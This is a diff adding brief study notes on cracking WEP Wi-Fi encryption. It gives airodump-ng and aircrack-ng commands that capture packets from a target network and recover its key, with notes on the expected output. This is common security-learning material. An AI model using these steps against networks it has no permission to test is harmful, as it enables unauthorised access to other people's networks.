@@ -1,0 +1,13 @@
+# Old encryption, can be easily cracked, uses an algortihm called RC4, wired equivalent privacy.
+# Client encrypts data using a key, encrypted packet sent in the air, router decrypts packet using the key
+
+BUSY NETWORK
+To crack WEP we need to:
+ 1) Capture a large number of packets/Ivs (using airodump-ng)
+ 2) Analyse the captured Ivs and crack the key (using aircrack-ng)
+
+$ airodump-ng --bssid BSSID -channel CHANNEL --write FILENAME INT
+# See column #Data … number of useful packets with different Ivs (100 000 #Data could be enough)
+$ aircrack-ng FILENAME
+# Now there should be a message Decrypted correctly: 100% and KEY FOUND! Wifi password is after ASCII: PASSWORD
+# If the ASCII password is not there, you could connect with decrapted MAC after KEY FOUND (copy the MAC address to a password prompt of the wifi network without double dots)
